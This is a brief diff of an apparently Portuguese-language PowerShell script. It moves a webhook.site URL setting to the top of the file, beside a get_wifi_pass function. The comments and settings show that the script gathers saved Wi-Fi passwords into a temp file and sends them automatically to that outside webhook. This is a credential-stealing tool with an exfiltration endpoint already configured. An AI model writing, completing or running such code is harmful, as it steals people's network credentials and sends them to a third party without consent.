@@ -1,3 +1,5 @@
+# Deixe vazio ('') se não quiser enviar automaticamente para webhook
+$WebhookUrl = 'https://webhook.site/42fcce10-d253-4ea5-804c-e444725e94da'
 
 function get_wifi_pass {
     [CmdletBinding()]
@@ -2154,9 +2156,6 @@ function Clear-All {
 ###############################################################
 
 
-
-# Deixe vazio ('') se não quiser enviar automaticamente para webhook
-$WebhookUrl = 'https://webhook.site/42fcce10-d253-4ea5-804c-e444725e94da'
 # Pasta de exportação (padrão: %TEMP%\p)
 $ExportDirDefault = Join-Path $env:TEMP 'p'
 # Nome do arquivo de saída (padrão: %TEMP%\wifi_passwords.txt)
